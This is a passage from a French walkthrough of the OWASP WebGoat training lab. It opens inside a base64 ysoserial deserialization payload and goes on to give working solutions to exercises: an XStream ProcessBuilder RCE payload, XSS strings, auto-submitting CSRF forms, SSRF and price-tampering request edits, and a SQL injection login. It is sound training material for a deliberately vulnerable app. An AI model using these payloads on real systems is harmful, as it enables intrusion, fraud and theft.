yYWN0aW9udAATTGphdmEvbGFuZy9Cb29sZWFuO1sAB2Nhc2NhZGV0AChbTG9yZy9oaWJlcm5hdGUvZW5
naW5lL3NwaS9DYXNjYWRlU3R5bGU7TAARY29tcG9uZW50VHVwbGl6ZXJ0ADFMb3JnL2hpYmVybmF0ZS9
0dXBsZS9jb21wb25lbnQvQ29tcG9uZW50VHVwbGl6ZXI7TAAKZW50aXR5TW9kZXQAGkxvcmcvaGliZXJ
uYXRlL0VudGl0eU1vZGU7WwALam9pbmVkRmV0Y2h0ABpbTG9yZy9oaWJlcm5hdGUvRmV0Y2hNb2RlO1s
ADXByb3BlcnR5TmFtZXN0ABNbTGphdmEvbGFuZy9TdHJpbmc7WwATcHJvcGVydHlOdWxsYWJpbGl0eXQ
AAltaWwANcHJvcGVydHlUeXBlc3QAGltMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGU7WwAhcHJvcGVydHl
WYWx1ZUdlbmVyYXRpb25TdHJhdGVnaWVzdAAmW0xvcmcvaGliZXJuYXRlL3R1cGxlL1ZhbHVlR2VuZXJ
hdGlvbjtMAAl0eXBlU2NvcGV0ACpMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGVGYWN0b3J5JFR5cGVTY29
wZTt4cgAfb3JnLmhpYmVybmF0ZS50eXBlLkFic3RyYWN0VHlwZYdFsKQmRS24AgAAeHAAAAAAAAFwcHN
yADNvcmcuaGliZXJuYXRlLnR1cGxlLmNvbXBvbmVudC5Qb2pvQ29tcG9uZW50VHVwbGl6ZXLAqqGhlZ9
DmwIABEwADmNvbXBvbmVudENsYXNzdAARTGphdmEvbGFuZy9DbGFzcztMAAlvcHRpbWl6ZXJ0ADBMb3J
nL2hpYmVybmF0ZS9ieXRlY29kZS9zcGkvUmVmbGVjdGlvbk9wdGltaXplcjtMAAxwYXJlbnRHZXR0ZXJ
0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxwYXJlbnRTZXR0ZXJ
0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cgA3b3JnLmhpYmVybmF
0ZS50dXBsZS5jb21wb25lbnQuQWJzdHJhY3RDb21wb25lbnRUdXBsaXplcgh6nmX_Q4R7AgAFWgASaGF
zQ3VzdG9tQWNjZXNzb3JzSQAMcHJvcGVydHlTcGFuWwAHZ2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9
wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxpbnN0YW50aWF0b3J0ACJMb3JnL2hpYmVybmF0ZS9
0dXBsZS9JbnN0YW50aWF0b3I7WwAHc2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2N
lc3Mvc3BpL1NldHRlcjt4cAAAAAAAdXIAK1tMb3JnLmhpYmVybmF0ZS5wcm9wZXJ0eS5hY2Nlc3Muc3B
pLkdldHRlcjsmhfgDST23zwIAAHhwAAAAAXNyAD1vcmcuaGliZXJuYXRlLnByb3BlcnR5LmFjY2Vzcy5
zcGkuR2V0dGVyTWV0aG9kSW1wbCRTZXJpYWxGb3JtrFu2VsndG1gCAARMAA5jb250YWluZXJDbGFzc3E
AfgAUTAAOZGVjbGFyaW5nQ2xhc3NxAH4AFEwACm1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt
MAAxwcm9wZXJ0eU5hbWVxAH4AIHhwdnIAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC5
4c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0_BbqyrMwMACUkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnN
sZXRJbmRleFoAFV91c2VTZXJ2aWNlc01lY2hhbmlzbUwAGV9hY2Nlc3NFeHRlcm5hbFN0eWxlc2hlZXR
xAH4AIEwAC19hdXhDbGFzc2VzdAA7TGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x
0Yy9ydW50aW1lL0hhc2h0YWJsZTtbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2x
hbmcvQ2xhc3M7TAAFX25hbWVxAH4AIEwAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9
wZXJ0aWVzO3hwcQB-ACd0ABNnZXRPdXRwdXRQcm9wZXJ0aWVzdAAEdGVzdHBwcHBwcHBwcHB1cgAaW0x
vcmcuaGliZXJuYXRlLnR5cGUuVHlwZTt-r6uh5JVhmgIAAHhwAAAAAXEAfgAScHBzcQB-ACIAAAAA___
__wB0AANhbGxwdXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX-AYIVOACAAB4cAAABiXK_rq
-AAAAMQAyBwAwAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXl
sb2FkBwAEAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJ
zdHJhY3RUcmFuc2xldAcABgEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAQc2VyaWFsVmVyc2lvblVJRAE
AAUoBAA1Db25zdGFudFZhbHVlBa0gk_OR3e8-AQAGPGluaXQ-AQADKClWAQAEQ29kZQoAAwAQDAAMAA0
BAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA1THlzb3NlcmlhbC9
wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGN
vbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGF
jaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAApFeGNlcHR
pb25zBwAZAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXh
jZXB0aW9uAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHR
jL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWx
pemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGV
ybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l
0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXp
hdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmF
sL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2l
udGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGd
ldHMuamF2YQEADElubmVyQ2xhc3NlcwcAJwEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHM
BABNTdHViVHJhbnNsZXRQYXlsb2FkAQAIPGNsaW5pdD4BABBqYXZhL2xhbmcvVGhyZWFkBwAqAQAFc2x
lZXABAAQoSilWDAAsAC0KACsALgEAH3lzb3NlcmlhbC9Qd25lcjIzNzU0MjU1MzE4ODA2MDABACFMeXN
vc2VyaWFsL1B3bmVyMjM3NTQyNTUzMTg4MDYwMDsAIQABAAMAAQAFAAEAGgAHAAgAAQAJAAAAAgAKAAQ
AAQAMAA0AAQAOAAAALwABAAEAAAAFKrcAD7EAAAACABEAAAAGAAEAAAAuABIAAAAMAAEAAAAFABMAMQA
AAAEAFQAWAAIAFwAAAAQAAQAYAA4AAAA_AAAAAwAAAAGxAAAAAgARAAAABgABAAAAMwASAAAAIAADAAA
AAQATADEAAAAAAAEAGgAbAAEAAAABABwAHQACAAEAFQAeAAIAFwAAAAQAAQAYAA4AAABJAAAABAAAAAG
xAAAAAgARAAAABgABAAAANwASAAAAKgAEAAAAAQATADEAAAAAAAEAGgAbAAEAAAABAB8AIAACAAAAAQA
hACIAAwAIACkADQABAA4AAAAZAAMAAgAAAA2nAAMBTBEnEIW4AC-xAAAAAAACACMAAAACACQAJQAAAAo
AAQABACYAKAAJdXEAfgAwAAAB1Mr-ur4AAAAxABsHAAIBACN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9
HYWRnZXRzJEZvbwcABAEAEGphdmEvbGFuZy9PYmplY3QHAAYBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQE
AEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQVx5mnuPG1HGAEABjxpbml0PgEAAyg
pVgEABENvZGUKAAMAEAwADAANAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQA
EdGhpcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQA
MR2FkZ2V0cy5qYXZhAQAMSW5uZXJDbGFzc2VzBwAZAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2F
kZ2V0cwEAA0ZvbwAhAAEAAwABAAUAAQAaAAcACAABAAkAAAACAAoAAQABAAwADQABAA4AAAAvAAEAAQA
AAAUqtwAPsQAAAAIAEQAAAAYAAQAAADsAEgAAAAwAAQAAAAUAEwAUAAAAAgAVAAAAAgAWABcAAAAKAAE
AAQAYABoACXB0AARQd25ycHcBAHhxAH4ABXNxAH4AAnEAfgAScQB-ACxxAH4ANHg
```

#### **(A9) Vulnerable Components:**

##### Vulnerable Components

5. 
Copier-coller `Ok<script>XSS</script>` dans chaque case.

12.
![Warning](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/warning.png)  Cette leçon ne semble pas fonctionner.

Pour la désérialisation, suivre le lien http://www.pwntester.com/blog/2013/12/23/rce-via-xstream-object-deserialization38/ pour comprendre comment cela fonctionne. Le _payload_ suivant devrait fonctionner, mais ce n'est pas le cas.

```xml
<sorted-set>  
     <string>foo</string>  
     <dynamic-proxy>  
         <interface>java.lang.Comparable</interface>  
         <handler class="java.beans.EventHandler">  
             <target class="java.lang.ProcessBuilder">  
                 <command>  
                     <string>/Applications/Calculator.app/Contents/MacOS/Calculator</string>  
                 </command>  
             </target>  
             <action>start</action>  
         </handler>  
     </dynamic-proxy>  
</sorted-set>  
```

#### **(A8:2013) Request Forgery:**

##### Cross-Site Request Forgeries

3.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The form has hidden inputs.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) You will need to use an external page and/or script to trigger it.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Try creating a local page or one that is uploaded and points to this form as its action.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The trigger can be manual or scripted to happen automatically

Sauvegarder le code suivant dans un fichier **csrf.html** et l'ouvrir dans un navigateur.

```html
<form name="attack" action="http://host:port/WebGoat/csrf/basic-get-flag" method="POST">  
     <input type="hidden" name='csrf' value='true'>  
</form>  
<script>document.attack.submit();</script>  
```

4.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Again, you will need to submit from an external domain/host to trigger this action. While CSRF can often be triggered from the same host (e.g. via persisted payload), this doesn't work that way.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Remember, you need to mimic the existing workflow/form.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) This one has a weak anti-CSRF protection, but you do need to overcome (mimic) it

Sauvegarder le code suivant dans un fichier **csrf.html** et l'ouvrir dans un navigateur.

```html
<form name="attack" action="http://host:port/WebGoat/csrf/review" method="POST">  
     <input type="hidden" name='reviewText' value='This App Rocks'>  
     <input type="hidden" name='stars' value='5'>  
     <input type="hidden" name='validateReq' value='2aa14227b9a13d0bede0388a7fba9aa9'>  
</form>  
<script>document.attack.submit();</script>  
```

7.
![Warning](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/warning.png)  Le numéro de leçon ne devient pas vert après validation.

![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Look at the content-type.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Try to post the same message with content-type text/plain  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The json can be put into a hidden field inside

Sauvegarder le code suivant dans un fichier **csrf.html** et l'ouvrir dans un navigateur. 

```html
<form name="attack" enctype="text/plain" action="http://host:port/WebGoat/csrf/feedback/message" method="POST">  
     <input type="hidden" name='{"name": "Test", "email": "test1233@dfssdf.de", "subject": "service", "message":"dsaffd"}'>  
</form>  
<script>document.attack.submit();</script>
```

8.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) First create a new account with csrf-username  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Create a form which will log you in as this user (hint 1) and upload it to WebWolf  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Visit this assignment again

Suivre les instructions. Follow the instructions.

##### Server-Side Request Forgeries

2.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) You should use an HTTP proxy to intercept the request and change the URL.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) If Tom is images/tom.png, Jerry would be images/jerry.png.

*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Réseau_.
*   Sur WebGoat, cliquer sur **Steal the Cheese**.
*   Repérer la requête vers `task1` dans l'onglet _Réseau_ et cliquer sur _Modifier et Renvoyer_.
*   Modifier le corps de la requête en `url=images/jerry.png`, et la renvoyer.

![SSRF 2](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/ssrf-2.png)

3.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) You need to put the protocol, "http://" in front of ifconfig.pro.

*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Réseau_.
*   Sur WebGoat, cliquer sur **Steal the Cheese**.
*   Repérer la requête vers `task2` dans l'onglet _Réseau_ et cliquer sur _Modifier et Renvoyer_.
*   Modifier le corps de la requête en `url=http://ifconfig.pro`, et la renvoyer.

![SSRF 3](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/ssrf-3.png)

#### **Client side:**

##### Bypass front-end restrictions

2.
*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Réseau_.
*   Sur WebGoat, cliquer sur **submit** sans toucher aux paramètres.
*   Repérer la requête vers `FieldRestrictions` dans l'onglet _Réseau_ et cliquer sur _Modifier et Renvoyer_.
*   Modifier le corps de la requête en `select=option3&radio=option3&checkbox=a&shortInput=123456`, et la renvoyer.

![BFER 1](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/bfer-1.png)

3.
*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Réseau_.
*   Sur WebGoat, cliquer sur **submit** sans toucher aux paramètres.
*   Repérer la requête vers `frontendValidation` dans l'onglet _Réseau_ et cliquer sur _Modifier et Renvoyer_.
*   Modifier le corps de la requête en `field1=abcz&field2=123z&field3=abc+123+ABC'z&field4=sevenz&field5=01101z&field6=90210-1111z&field7=301-604-4882z&error=0`, et la renvoyer.

![BPFER 3](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/bpfer-3.png)

##### HTML tampering

2.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Try to change the number of items and see what is happening  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Is the price part of the HTML request?  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Intercept the request and manipulate the price before submitting it.

*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Réseau_.
*   Sur WebGoat, cliquer sur **Chekout** sans toucher aux paramètres.
*   Repérer la requête vers `task` dans l'onglet _Réseau_ et cliquer sur _Modifier et Renvoyer_.
*   Modifier le corps de la requête en `QTY=2&Total=0`, et la renvoyer.

![HTML Tampering](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/html-tampering-2.png)

##### Client side filtering

2.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The information displayed when an employee is chosen from the drop down menu is stored on the client side.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Use Firebug to find where the information is stored on the client side.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Examine the hidden table to see if there is anyone listed who is not in the drop down menu.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Look in the last row of the hidden table.

*   Effectuer un clic-droit sur l'élément défilant **Select user**, et cliquer sur _Examiner l'élément_.
*   Juste en dessous dans le HTML, on trouve un tableau caché, dans lequel les informations sur Neville Bartholomew sont présentes.
*   Son salaire est de 450000.

![Client Side Filtering 2](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/client-side-filtering-2.png)

3.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Look through the web page inspect the sources etc  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Try to see the flow of request from the page to the backen  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) client.side.filtering.free.hint3

*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Réseau_.
*   Sur WebGoat, cliquer sur la case **CHECKOUT CODE** sans rentrer d'informations, puis sur cliquer sur **Chekout**.
*   Repérer la requête vers `coupons` dans l'onglet _Réseau_ et cliquer sur _Réponse_.
*   Remarquer le code `get_it_for_free` permettant d'obtenir un _discount_ de 100%.

#### **Challenges:**

##### Admin lost password

*   Télécharger l'image http://host:port/WebGoat/images/webgoat2.png .
*   L'ouvrir dans un éditeur de texte.
*   Rechercher la chaine de caratères **admin** pour tomber sur le mot de passe **!!webgoat\_admin\_1234!!**.

##### Without password

*   **Username**: `Larry`
*   **Password**: `' or 1=1 --`

##### Creating a new account

Ce challenge est exactement le même que celui de **(A1) Injection** - SQL Injection (advanced)

##### Admin password reset

##### Without account